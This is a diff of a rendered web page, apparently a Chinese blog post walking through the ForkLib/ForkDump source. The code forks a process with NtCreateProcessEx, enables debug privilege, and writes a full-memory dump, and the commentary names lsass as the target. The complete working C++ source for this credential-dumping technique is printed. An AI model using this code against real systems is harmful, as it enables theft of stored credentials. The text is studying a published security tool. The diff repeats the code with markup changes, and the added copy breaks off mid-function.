-</span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess;
-}
-
-<span style="color:#75715e">/// &lt;summary&gt;
-</span><span style="color:#75715e">/// Attempts to clean up the current snapshot by terminating the forked process.
-</span><span style="color:#75715e">/// &lt;/summary&gt;
-</span><span style="color:#75715e">/// &lt;returns&gt;TRUE if clean up successful, FALSE otherwise.&lt;/returns&gt;
-</span><span style="color:#75715e"></span>BOOL
-ForkSnapshot<span style="color:#f92672">::</span>CleanSnapshot (
-	VOID
-	)
-{
-	BOOL cleanSuccess;
-
-	cleanSuccess <span style="color:#f92672">=</span> TRUE;
-
-	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess)
-	{
-		cleanSuccess <span style="color:#f92672">=</span> TerminateProcess(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess, <span style="color:#ae81ff">0</span>);
-		CloseHandle(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess);
-		<span style="color:#66d9ef">if</span> (cleanSuccess <span style="color:#f92672">==</span> FALSE)
-		{
-			DBGPRINT(<span style="color:#e6db74">&#34;[FORKLIB] Failed to terminate process with last error %i.&#34;</span>, GetLastError());
-		}
-		<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess <span style="color:#f92672">=</span> NULL;
-	}
-	
-	<span style="color:#66d9ef">return</span> cleanSuccess;
-}
-</code></pre></div><p>这个cpp就是实现了头文件的功能</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * FORKLIB - Process Snapshotting via forking.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * This file is subject to the terms and conditions defined in
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * file &#39;LICENSE&#39;, which is part of this source code package.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * COPYRIGHT Bill Demirkapi 2021
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;pch.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;ForkLib.h&#34;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// Initialize a fork snapshot. Attempts to open a PROCESS_CREATE_PROCESS handle to the target.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;/summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;param name=&#34;TargetProcessId&#34;&gt;The process ID of the target process to fork.&lt;/param&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>ForkSnapshot<span style="color:#f92672">::</span>ForkSnapshot (
+</span></span><span style="display:flex;"><span>	_In_ DWORD TargetProcessId
+</span></span><span style="display:flex;"><span>	)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>TargetProcess <span style="color:#f92672">=</span> OpenProcess(PROCESS_CREATE_PROCESS, FALSE, TargetProcessId);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>TargetProcess <span style="color:#f92672">==</span> NULL)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		DBGPRINT(<span style="color:#e6db74">&#34;[FORKLIB] Failed to open a PROCESS_CREATE_PROCESS handle to target process %i with last error %i.&#34;</span>, TargetProcessId, GetLastError());
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// Initialize a fork snapshot.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;/summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;param name=&#34;TargetProcess&#34;&gt;The process ID of the target process to fork.&lt;/param&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>ForkSnapshot<span style="color:#f92672">::</span>ForkSnapshot (
+</span></span><span style="display:flex;"><span>	_In_ HANDLE TargetProcess
+</span></span><span style="display:flex;"><span>	)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>TargetProcess <span style="color:#f92672">=</span> TargetProcess;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// Deconstruct a fork snapshot. This will clean up any open snapshots.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;/summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>ForkSnapshot<span style="color:#f92672">::~</span>ForkSnapshot (
+</span></span><span style="display:flex;"><span>	VOID
+</span></span><span style="display:flex;"><span>	)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CleanSnapshot();
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// Take a snapshot of the target process.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;/summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;returns&gt;A PROCESS_ALL_ACCESS HANDLE to a snapshot of the target process.&lt;/returns&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>HANDLE
+</span></span><span style="display:flex;"><span>ForkSnapshot<span style="color:#f92672">::</span>TakeSnapshot (
+</span></span><span style="display:flex;"><span>	VOID
+</span></span><span style="display:flex;"><span>	)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	NTSTATUS status;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// If we have an existing snapshot process, we need to clean it up before creating another one.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess <span style="color:#f92672">!=</span> NULL)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CleanSnapshot() <span style="color:#f92672">==</span> FALSE)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			DBGPRINT(<span style="color:#e6db74">&#34;[FORKLIB] Failed to clean up existing snapshot before taking another one.&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// Attempt to create a fork of the target process.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	status <span style="color:#f92672">=</span> NtCreateProcessEx(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess,
+</span></span><span style="display:flex;"><span>							   PROCESS_ALL_ACCESS,
+</span></span><span style="display:flex;"><span>							   NULL,
+</span></span><span style="display:flex;"><span>							   <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>TargetProcess,
+</span></span><span style="display:flex;"><span>							   <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>							   NULL,
+</span></span><span style="display:flex;"><span>							   NULL,
+</span></span><span style="display:flex;"><span>							   NULL,
+</span></span><span style="display:flex;"><span>							   <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (NT_SUCCESS(status) <span style="color:#f92672">==</span> FALSE)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		DBGPRINT(<span style="color:#e6db74">&#34;[FORKLIB] Failed to create fork process with status 0x%X.&#34;</span>, status);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// If the previous call succeeded, we have created a fork/snapshot of the target process.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">// Yes, it really is that simple.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">return</span> <span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// Attempts to clean up the current snapshot by terminating the forked process.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;/summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;returns&gt;TRUE if clean up successful, FALSE otherwise.&lt;/returns&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>BOOL
+</span></span><span style="display:flex;"><span>ForkSnapshot<span style="color:#f92672">::</span>CleanSnapshot (
+</span></span><span style="display:flex;"><span>	VOID
+</span></span><span style="display:flex;"><span>	)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>	BOOL cleanSuccess;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	cleanSuccess <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess)
+</span></span><span style="display:flex;"><span>	{
+</span></span><span style="display:flex;"><span>		cleanSuccess <span style="color:#f92672">=</span> TerminateProcess(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>		CloseHandle(<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (cleanSuccess <span style="color:#f92672">==</span> FALSE)
+</span></span><span style="display:flex;"><span>		{
+</span></span><span style="display:flex;"><span>			DBGPRINT(<span style="color:#e6db74">&#34;[FORKLIB] Failed to terminate process with last error %i.&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> cleanSuccess;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>这个cpp就是实现了头文件的功能</p>
 <p>首先是一个构造方法，传入目标的PID；初始化fork快照，然后打开目标进程，如果没有成功打开就输出下错误信息</p>
 <p>然后重写了方法，如果直接传了一个进程句柄，就把本类里未定义的TargetProcess赋值一下</p>
 <p>析构函数就是调用<code>CleanSnapshot</code>，清空fork快照</p>
 <p>然后就是<code>TakeSnapshot</code>函数，首先判断是否有<code>CurrentSnapshotProcess</code>，如果有就清空返回了。没有就创建一个进程</p>
 <p><strong>这里我们创建的进程是lsass的目标句柄，将创建远程进程的分支</strong>（这里也就是fork）</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++">NtCreateProcessEx(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess,PROCESS_ALL_ACCESS,NULL,<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>TargetProcess,<span style="color:#ae81ff">0</span>,NULL,NULL,NULL,<span style="color:#ae81ff">0</span>);
-</code></pre></div><p><code>CurrentSnapshotProcess</code>是句柄，<code>TargetProcess</code>是PID，然后判断是否打开，没打开就输出debug信息，打开了就返回句柄。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>NtCreateProcessEx(<span style="color:#f92672">&amp;</span><span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>CurrentSnapshotProcess,PROCESS_ALL_ACCESS,NULL,<span style="color:#66d9ef">this</span><span style="color:#f92672">-&gt;</span>TargetProcess,<span style="color:#ae81ff">0</span>,NULL,NULL,NULL,<span style="color:#ae81ff">0</span>);
+</span></span></code></pre></div><p><code>CurrentSnapshotProcess</code>是句柄，<code>TargetProcess</code>是PID，然后判断是否打开，没打开就输出debug信息，打开了就返回句柄。</p>
 <p>这个主文件里最后一个函数就是<code>CleanSnapshot</code>了，就是用来清空快照的</p>
 <p>判断是否<code>CurrentSnapshotProcess</code>有没有，有就调用<code>TerminateProcess</code>来终止指定进程及其所有线程，如果没终止成功就输出debug信息，最后强制把<code>CurrentSnapshotProcess赋值</code>为NULL</p>
 <p>到这里ForkLib这个文件夹内的内容就分析完了</p>
 <h3 id="forkdump">ForkDump</h3>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c++" data-lang="c++"><span style="color:#75715e">//
-</span><span style="color:#75715e">// ForkDump
-</span><span style="color:#75715e">// Dump the memory of a given process with a Process Forking attack.
-</span><span style="color:#75715e">// 
-</span><span style="color:#75715e">// COPYRIGHT Bill Demirkapi 2021. All Rights Reserved.
-</span><span style="color:#75715e">//
-</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdio&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ForkLib.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Dbghelp.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">#pragma comment (lib, &#34;Dbghelp.lib&#34;)
-</span><span style="color:#75715e">#pragma comment (lib, &#34;ForkLib.lib&#34;)
-</span><span style="color:#75715e"></span>
-<span style="color:#75715e">/// &lt;summary&gt;
-</span><span style="color:#75715e">/// Escalate the current processes&#39; debug privileges.
-</span><span style="color:#75715e">/// &lt;/summary&gt;
-</span><span style="color:#75715e">/// &lt;returns&gt;TRUE if debug privilege enabled, FALSE otherwise.&lt;/returns&gt;
-</span><span style="color:#75715e"></span>BOOL
-<span style="color:#a6e22e">EscalateDebugPrivilege</span> (
-    VOID
-    )
-{
-    BOOL result;
-    HANDLE currentToken;
-    LUID currentDebugValue;
-    TOKEN_PRIVILEGES newTokenPrivilege;
-
-    result <span style="color:#f92672">=</span> FALSE;
-    currentToken <span style="color:#f92672">=</span> NULL;
-
-    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Open the current processes&#39; token.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES <span style="color:#f92672">|</span> TOKEN_QUERY, <span style="color:#f92672">&amp;</span>currentToken) <span style="color:#f92672">==</span> FALSE)
-    {
-        printf(<span style="color:#e6db74">&#34;Failed to open the token of the current process with the last error %i.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, GetLastError());
-        <span style="color:#66d9ef">goto</span> Exit;
-    }
-
-    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Lookup the LUID of the debug privilege.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, <span style="color:#f92672">&amp;</span>currentDebugValue) <span style="color:#f92672">==</span> FALSE)
-    {
-        printf(<span style="color:#e6db74">&#34;Failed to lookup the current debug privilege with the last error %i.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, GetLastError());
-        CloseHandle(currentToken);
-        <span style="color:#66d9ef">goto</span> Exit;
-    }
-
-    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Create our elevated token privilege.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    newTokenPrivilege.PrivilegeCount <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
-    newTokenPrivilege.Privileges[<span style="color:#ae81ff">0</span>].Luid <span style="color:#f92672">=</span> currentDebugValue;
-    newTokenPrivilege.Privileges[<span style="color:#ae81ff">0</span>].Attributes <span style="color:#f92672">=</span> SE_PRIVILEGE_ENABLED;
-
-    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Adjust the current processes&#39; token.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (AdjustTokenPrivileges(currentToken, FALSE, <span style="color:#f92672">&amp;</span>newTokenPrivilege, <span style="color:#66d9ef">sizeof</span>(newTokenPrivilege), NULL, NULL) <span style="color:#f92672">==</span> FALSE <span style="color:#f92672">||</span> 
-        GetLastError() <span style="color:#f92672">!=</span> ERROR_SUCCESS)
-    {
-        printf(<span style="color:#e6db74">&#34;Failed to adjust debug privileges with the last error %i.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, GetLastError());
-        CloseHandle(currentToken);
-        <span style="color:#66d9ef">goto</span> Exit;
-    }
-
-    result <span style="color:#f92672">=</span> TRUE;
-Exit:
-    <span style="color:#66d9ef">if</span> (currentToken)
-    {
-        CloseHandle(currentToken);
-    }
-    <span style="color:#66d9ef">return</span> result;
-}
-
-<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv)
-{
-    <span style="color:#66d9ef">int</span> returnCode;
-    std<span style="color:#f92672">::</span>string targetProcessIdStr;
-    ULONG targetProcessId;
-    std<span style="color:#f92672">::</span>string dumpFileName;
-    HANDLE dumpFile;
-    ForkSnapshot<span style="color:#f92672">*</span> snapshot;
-    HANDLE snapshotProcess;
-
-    dumpFile <span style="color:#f92672">=</span> NULL;
-    snapshotProcess <span style="color:#f92672">=</span> NULL;
-    snapshot <span style="color:#f92672">=</span> NULL;
-    returnCode <span style="color:#f92672">=</span> FALSE;
-
-    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Ensure we have the expected arguments.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">3</span>)
-    {
-        printf(<span style="color:#e6db74">&#34;ForkDump.exe [dump file name] [target process ID]</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
-        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-    }
-
-    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Retrieve and parse the arguments.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    dumpFileName <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
-    targetProcessIdStr <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">2</span>];
-    targetProcessId <span style="color:#f92672">=</span> std<span style="color:#f92672">::</span>stoi(targetProcessIdStr);
-
-    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Create the dump file.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    dumpFile <span style="color:#f92672">=</span> CreateFileA(dumpFileName.c_str(), GENERIC_ALL, <span style="color:#ae81ff">0</span>, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-    <span style="color:#66d9ef">if</span> (dumpFile <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
-    {
-        printf(<span style="color:#e6db74">&#34;Failed to open dump file %s with the last error %i.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, dumpFileName.c_str(), GetLastError());
-        <span style="color:#66d9ef">goto</span> Exit;
-    }
-
-    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Create a fork snapshot of the target.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    snapshot <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ForkSnapshot(targetProcessId);
-    snapshotProcess <span style="color:#f92672">=</span> snapshot<span style="color:#f92672">-&gt;</span>TakeSnapshot();
-    <span style="color:#66d9ef">if</span> (snapshotProcess <span style="color:#f92672">==</span> NULL)
-    {
-        <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>        <span style="color:#75715e">// If our first try fails, attempt to escalate our debug privilege.
-</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;Failed to take a snapshot of the target process. Attempting to escalate debug privilege...</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
-        <span style="color:#66d9ef">if</span> (EscalateDebugPrivilege() <span style="color:#f92672">==</span> FALSE)
-        {
-            printf(<span style="color:#e6db74">&#34;Failed to escalate debug privileges, are you running ForkDump as Administrator?</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
-            <span style="color:#66d9ef">goto</span> Exit;
-        }
-
-        <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>        <span style="color:#75715e">// Retry with debug privileges.
-</span><span style="color:#75715e"></span>        <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>        printf(<span style="color:#e6db74">&#34;Escalated debug privileges, attempting to take another snapshot.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
-        snapshot<span style="color:#f92672">-&gt;</span>CleanSnapshot();
-        <span style="color:#66d9ef">delete</span> snapshot;
-        snapshot <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ForkSnapshot(targetProcessId);
-        snapshotProcess <span style="color:#f92672">=</span> snapshot<span style="color:#f92672">-&gt;</span>TakeSnapshot();
-        <span style="color:#66d9ef">if</span> (snapshotProcess <span style="color:#f92672">==</span> NULL)
-        {
-            <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>            <span style="color:#75715e">// If we failed once again, this likely means that there is a difference in process privileges or the handle was stripped.
-</span><span style="color:#75715e"></span>            <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>            printf(<span style="color:#e6db74">&#34;Second attempt at taking a snapshot of the target failed. It is likely that there is a difference in process privilege or the handle was stripped.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>);
-            <span style="color:#66d9ef">goto</span> Exit;
-        }
-    }
-
-    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">// Create a dump of the forked process.
-</span><span style="color:#75715e"></span>    <span style="color:#75715e">//
-</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (MiniDumpWriteDump(snapshotProcess, GetProcessId(snapshotProcess), dumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL) <span style="color:#f92672">==</span> FALSE)
-    {
-        printf(<span style="color:#e6db74">&#34;Failed to create a dump of the forked process with the last error %i.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, GetLastError());
-        <span style="color:#66d9ef">goto</span> Exit;
-    }
-
-    returnCode <span style="color:#f92672">=</span> TRUE;
-    printf(<span style="color:#e6db74">&#34;Successfully dumped process %i to %s!</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">n&#34;</span>, targetProcessId, dumpFileName.c_str());
-Exit:
-    <span style="color:#66d9ef">if</span> (dumpFile <span style="color:#f92672">!=</span> INVALID_HANDLE_VALUE)
-    {
-        CloseHandle(dumpFile);
-    }
-    <span style="color:#66d9ef">if</span> (snapshot <span style="color:#f92672">!=</span> NULL)
-    {
-        snapshot<span style="color:#f92672">-&gt;</span>CleanSnapshot();
-        <span style="color:#66d9ef">delete</span> snapshot;
-    }
-    <span style="color:#66d9ef">return</span> returnCode;
-}
-</code></pre></div><p><code>EscalateDebugPrivilege</code>没啥好说的 提升权限的函数，也可以用<code>RtlAdjustPrivilege</code>进行提权</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// ForkDump
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// Dump the memory of a given process with a Process Forking attack.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">// COPYRIGHT Bill Demirkapi 2021. All Rights Reserved.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">//
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Windows.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;cstdio&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;ForkLib.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;Dbghelp.h&gt;</span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment (lib, &#34;Dbghelp.lib&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#pragma comment (lib, &#34;ForkLib.lib&#34;)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// Escalate the current processes&#39; debug privileges.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;/summary&gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">/// &lt;returns&gt;TRUE if debug privilege enabled, FALSE otherwise.&lt;/returns&gt;
